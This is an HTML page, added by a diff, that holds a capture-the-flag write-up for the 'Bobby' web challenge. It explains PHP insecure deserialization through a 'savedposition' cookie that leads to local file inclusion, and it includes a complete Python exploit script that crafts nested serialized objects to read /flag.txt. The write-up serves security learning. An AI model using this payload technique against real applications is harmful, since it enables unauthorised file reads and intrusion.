@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOFLAKY - Bobby Web Challenge Writeup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #0c0c0c;
+            color: #fff;
+            line-height: 1.6;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 2rem;
+            background: #0c0c0c;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .logo {
+            color: #fff;
+            text-decoration: none;
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+        }
+
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+
+        nav a:hover {
+            background-color: #7D5DE6;
+        }
+        .back-button-container {
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 1rem;
+}
+
+.back-button {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    background-color: #2a2a2a;
+    padding: 0.8rem;
+    border-radius: 50%;
+    text-decoration: none;
+    transition: all 0.3s ease;
+    width: 40px;
+    height: 40px;
+}
+
+.back-button:hover {
+    background-color: #7D5DE6;
+    transform: translateX(-3px);
+}
+
+.back-button svg {
+    width: 20px;
+    height: 20px;
+}
+        .writeup-container {
+            max-width: 800px;
+            margin: 4rem auto;
+            padding: 0 1rem;
+        }
+
+        .writeup-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .writeup-header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .challenge-meta {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+        }
+
+        .category {
+            background: #7D5DE6;
+            padding: 0.3rem 0.8rem;
+            border-radius: 15px;
+        }
+
+        .diff {
+            color: #FFC600;
+            font-weight: bold;
+        }
+
+        .writeup-content {
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 2rem;
+        }
+
+        .section {
+            margin-bottom: 2rem;
+        }
+
+        .section:last-child {
+            margin-bottom: 0;
+        }
+
+        .section h2 {
+            color: #7D5DE6;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+
+        .flag {
+            display: inline-block;
+            background: #2a2a2a;
+            padding: 1rem;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 1.1rem;
+        }
+
+        /* VS Code-like styling for code blocks */
+        pre.code {
+            display: block;
+            background: #1E1E1E;
+            padding: 1rem;
+            border-radius: 5px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            margin: 1rem 0;
+            overflow-x: auto;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid #333;
+        }
+        
+        .code-bar {
+            display: flex;
+            justify-content: space-between;
+            background: #252526;
+            padding: 0.5rem 1rem;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 5px;
+            border-bottom: 1px solid #333;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 0.8rem;
+        }
+        
+        .code-bar .file-name {
+            color: #CCCCCC;
+        }
+        
+        .code-bar .language {
+            color: #858585;
+        }
+        
+        .code-content {
+            padding: 1rem;
+        }
+        
+        /* Syntax highlighting */
+        .keyword {
+            color: #569CD6;
+        }
+        
+        .function {
+            color: #DCDCAA;
+        }
+        
+        .variable {
+            color: #9CDCFE;
+        }
+        
+        .string {
+            color: #CE9178;
+        }
+        
+        .comment {
+            color: #6A9955;
+        }
+        
+        .operator {
+            color: #D4D4D4;
+        }
+        
+        .bracket {
+            color: #D4D4D4;
+        }
+        
+        .parameter {
+            color: #9CDCFE;
+        }
+
+        .challenge-files {
+            margin-top: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .challenge-files h2 {
+            color: #7D5DE6;
+            font-size: 1.5rem;
+        }
+
+        .challenge-files a {
+            color: #7D5DE6;
+            text-decoration: none;
+            padding: 5px;
+            background: #333;
+            border-radius: 5px;
+            transition: background 0.3s;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .challenge-files a:hover {
+            background: #5e3dbf;
+        }
+        
+        code.inline {
+            display: inline;
+            padding: 0.2rem 0.4rem;
+            background: #333;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        
+        .url {
+            word-break: break-all;
+        }
+
+        @media (max-width: 768px) {
+            .writeup-container {
+                margin: 2rem auto;
+            }
+            
+            .writeup-header h1 {
+                font-size: 2rem;
+            }
+            
+            .writeup-content {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="index.html" class="logo">SOFLAKY</a>
+        <nav>
+            <ul>
+                <li><a href="index.html">Home</a></li>
+                <li><a href="writeups.html">Writeups</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <div class="back-button-container">
+    <a href="cyberNights1.html" class="back-button">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 12H5M12 19l-7-7 7-7"/>
+        </svg>
+    </a>
+</div>
+        <article class="writeup-container">
+            <header class="writeup-header">
+                <h1>Bobby Web Challenge</h1>
+                <div class="challenge-meta">
+                    <span class="category">Web Security</span>
+                    <span class="diff">500</span>
+                </div>
+            </header>
+            <section class="writeup-content">
+                <div class="section">
+                    <h2>Description</h2>
+                    <p>"My friend is a chess enthusiast. He has a website where he can analyze his friends' games."</p>
+                </div>
+
+                <div class="section">
+                    <h2>Identifying the Vulnerability</h2>
+                    <p>After examining the application, I found that it was vulnerable to <strong>PHP Object Injection (POI)</strong> via insecure deserialization, which could lead to <strong>Local File Inclusion (LFI)</strong>.</p>
+                    
+                    <p>From the challenge description, it was evident that the website processed chess game positions. The application stored serialized PHP objects, which hinted at a possible object injection vulnerability.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Finding the Attack Vector</h2>
+                    <p>By inspecting the cookies, I discovered a key named <code class="inline">savedposition</code>. This suggested that the application stored serialized data client-side. Since PHP uses <code class="inline">unserialize()</code>, it could be possible to craft a malicious object.</p>
+                    
+                    <p>The vulnerability likely existed in the way the application processed the saved chess positions, allowing me to manipulate the serialized PHP objects.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Crafting the Exploit</h2>
+                    <p>I created a payload that takes advantage of <strong>PHP object deserialization</strong> to manipulate the <code class="inline">ChessGame</code> class and change the <code class="inline">position</code> attribute to reference a system file (<code class="inline">/flag.txt</code>).</p>
+                    
+                    <p>The exploit script constructs a serialized PHP object with these classes:</p>
+                    <ul style="margin-left: 2rem; margin-top: 1rem;">
+                        <li><strong>ChessGame</strong>: The <code class="inline">position</code> field is set to a file path.</li>
+                        <li><strong>PositionAnalyzer</strong>: Contains the ChessGame object.</li>
+                        <li><strong>MoveValidator</strong>: Encapsulates the PositionAnalyzer object.</li>
+                    </ul>
+                    
+                    <div class="code-container">
+                        <div class="code-bar">
+                            <span class="file-name">exploit.py</span>
+                            <span class="language">Python</span>
+                        </div>
+                        <pre class="code"><span class="keyword">#!/usr/bin/env</span> <span class="variable">python3</span>
+<span class="keyword">import</span> <span class="variable">base64</span>
+<span class="keyword">import</span> <span class="variable">requests</span>
+<span class="keyword">import</span> <span class="variable">urllib3</span>
+
+<span class="variable">urllib3</span><span class="operator">.</span><span class="variable">disable_warnings</span><span class="bracket">(</span><span class="variable">urllib3</span><span class="operator">.</span><span class="variable">exceptions</span><span class="operator">.</span><span class="variable">InsecureRequestWarning</span><span class="bracket">)</span>
+
+<span class="variable">url</span> <span class="operator">=</span> <span class="string">"https://af5fb186717328db2b532.playat.flagyard.com/"</span>
+<span class="variable">filepath</span> <span class="operator">=</span> <span class="string">"/flag.txt"</span>
+<span class="variable">phpsessid</span> <span class="operator">=</span> <span class="string">"ea8e0b63d85fa946c1a188271086be11"</span>
+
+<span class="comment"># Craft malicious PHP objects</span>
+<span class="variable">chess_game</span> <span class="operator">=</span> <span class="function">f</span><span class="string">'O:9:"ChessGame":1:{{s:8:"position";s:{len(filepath)}:"{filepath}";}}'</span>
+<span class="variable">position_analyzer</span> <span class="operator">=</span> <span class="function">f</span><span class="string">'O:16:"PositionAnalyzer":2:{{s:10:"gameRecord";s:4:"test";s:15:"currentPosition";{chess_game}}}'</span>
+<span class="variable">move_validator</span> <span class="operator">=</span> <span class="function">f</span><span class="string">'O:13:"MoveValidator":3:{{s:4:"move";s:2:"e4";s:8:"analyzer";{position_analyzer};s:5:"chess";{chess_game}}}'</span>
+<span class="variable">payload</span> <span class="operator">=</span> <span class="variable">base64</span><span class="operator">.</span><span class="function">b64encode</span><span class="bracket">(</span><span class="variable">move_validator</span><span class="operator">.</span><span class="function">encode</span><span class="bracket">()</span><span class="bracket">)</span><span class="operator">.</span><span class="function">decode</span><span class="bracket">()</span>
+
+<span class="variable">cookies</span> <span class="operator">=</span> <span class="bracket">{</span>
+    <span class="string">'savedposition'</span><span class="operator">:</span> <span class="variable">payload</span>,
+    <span class="string">'PHPSESSID'</span><span class="operator">:</span> <span class="variable">phpsessid</span>
+<span class="bracket">}</span>
+
+<span class="keyword">try</span><span class="operator">:</span>
+    <span class="variable">response</span> <span class="operator">=</span> <span class="variable">requests</span><span class="operator">.</span><span class="function">get</span><span class="bracket">(</span><span class="variable">url</span>, <span class="variable">cookies</span><span class="operator">=</span><span class="variable">cookies</span>, <span class="variable">verify</span><span class="operator">=</span><span class="keyword">False</span><span class="bracket">)</span>
+    <span class="function">print</span><span class="bracket">(</span><span class="variable">response</span><span class="operator">.</span><span class="variable">text</span><span class="bracket">)</span>
+    
+    <span class="comment"># Save response to a file</span>
+    <span class="variable">filename</span> <span class="operator">=</span> <span class="variable">filepath</span><span class="operator">.</span><span class="function">replace</span><span class="bracket">(</span><span class="string">"/"</span>, <span class="string">""</span><span class="bracket">)</span><span class="operator">.</span><span class="function">replace</span><span class="bracket">(</span><span class="string">"."</span>, <span class="string">"_"</span><span class="bracket">)</span> <span class="operator">+</span> <span class="string">".html"</span>
+    <span class="keyword">with</span> <span class="function">open</span><span class="bracket">(</span><span class="variable">filename</span>, <span class="string">"w"</span><span class="bracket">)</span> <span class="keyword">as</span> <span class="variable">f</span><span class="operator">:</span>
+        <span class="variable">f</span><span class="operator">.</span><span class="function">write</span><span class="bracket">(</span><span class="variable">response</span><span class="operator">.</span><span class="variable">text</span><span class="bracket">)</span>
+    <span class="function">print</span><span class="bracket">(</span><span class="function">f</span><span class="string">"\n[+] Response saved to {filename}"</span><span class="bracket">)</span>
+
+<span class="keyword">except</span> <span class="variable">Exception</span> <span class="keyword">as</span> <span class="variable">e</span><span class="operator">:</span>
+    <span class="function">print</span><span class="bracket">(</span><span class="function">f</span><span class="string">"[!] Error: {e}"</span><span class="bracket">)</span></pre>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h2>Understanding the Exploit</h2>
+                    <p>Let's break down how the exploit works:</p>
+                    
+                    <ol style="margin-left: 2rem; margin-top: 1rem;">
+                        <li>I create three serialized PHP objects that mimic the application's class structure.</li>
+                        <li>The <code class="inline">ChessGame</code> object has its <code class="inline">position</code> property set to <code class="inline">/flag.txt</code>.</li>
+                        <li>This object is wrapped in <code class="inline">PositionAnalyzer</code> and <code class="inline">MoveValidator</code> objects to match the expected structure.</li>
+                        <li>The entire object chain is Base64-encoded and injected into the <code class="inline">savedposition</code> cookie.</li>
+                        <li>When the application unserializes this data, it processes the <code class="inline">position</code> value which points to <code class="inline">/flag.txt</code>.</li>
+                        <li>This triggers a Local File Inclusion that reads and displays the flag file.</li>
+                    </ol>
+                </div>
+
+                <div class="section">
+                    <h2>Execution and Results</h2>
+                    <p>When I sent the crafted request to the server:</p>
+                    
+                    <ol style="margin-left: 2rem; margin-top: 1rem;">
+                        <li>The server deserialized the malicious objects.</li>
+                        <li>When processing the chess position, it accessed the file path I specified (<code class="inline">/flag.txt</code>).</li>
+                        <li>Due to the local file inclusion vulnerability, the contents of the flag were included in the response.</li>
+                        <li>The script successfully retrieved and displayed the flag.</li>
+                    </ol>
+                </div>
+
+      
+
+                <div class="section">
+                    <h2>Flag</h2>
+                    <code class="flag">FlagY{*******}</code>
+                </div>
+            </section>
+        </article>
+    </main>
+</body>
+</html>
